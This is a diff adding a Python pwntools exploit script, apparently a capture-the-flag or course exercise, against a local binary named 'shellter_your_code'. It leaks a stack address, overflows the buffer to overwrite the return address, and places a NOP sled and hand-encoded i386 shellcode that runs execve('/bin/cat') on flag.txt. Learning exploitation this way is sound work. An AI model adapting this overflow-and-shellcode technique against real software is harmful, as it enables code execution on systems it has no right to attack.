@@ -1,0 +1,56 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./shellter_your_code", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+# Logic:
+# Run the File
+# Get the Stack Address printed by printf and convert it to hex (little endian)
+# Get the Number of "garbage" Bytes until eip will be overwritten (cyclic 'raaa' was found with gdb and cyclic as the input)
+# Then we create a nop sledge. I mean we COULD calculate the exact address where the shellcode needs to be placed....but nah just nop sledge 
+# Shellcode is the shellcode for execve("bin/cat", ""bin/cat", "flag.txt"") and was converted with pwn shellcraft 
+# Command was (32 Bit Linux): pwn shellcraft i386.linux.execve "/bin/cat" "['/bin/cat', 'flag.txt']" -f s
+# So to summaries, the return addr will be overwritten to something on the stack, there the programm will fall into a nop sledge 
+# until it runs into our shellcode, and then the whole process will be overwritten with cat flag.txt and prints the Flag
+def main():
+    io = start()
+    # add your exploit code here
+    addr = io.recv()
+    
+    retValue = p32(int(addr[6:16], 16))
+
+    # Same Logic as with Task 16 with cyclic
+    filler = cyclic(cyclic_find('raaa'))
+
+    nopSledge = b"\x90" * 500 # just to be sure 
+
+    shellCode = b"j\x01\xfe\x0c\x24h\x2fcath\x2fbin\x89\xe3jthg.txh\x01\x01\x01\x01\x814\x24\x01gm\x60h\x2fcath\x2fbin1\xc9Qj\x0dY\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+
+    io.sendline(filler + retValue + nopSledge + shellCode) # shellcode needs to be after nop, because eip will go to the higher stack addr
+    io.recv()
+    sol = io.recv()
+    print(sol.decode('utf-8')[:-1])
+
+
+if __name__ == "__main__":
+    main()
